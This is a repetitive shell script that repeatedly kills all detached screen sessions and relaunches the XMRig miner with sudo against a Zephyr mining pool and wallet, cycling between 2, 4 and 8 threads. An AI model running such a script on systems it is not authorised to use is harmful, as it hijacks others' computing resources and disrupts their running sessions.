screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
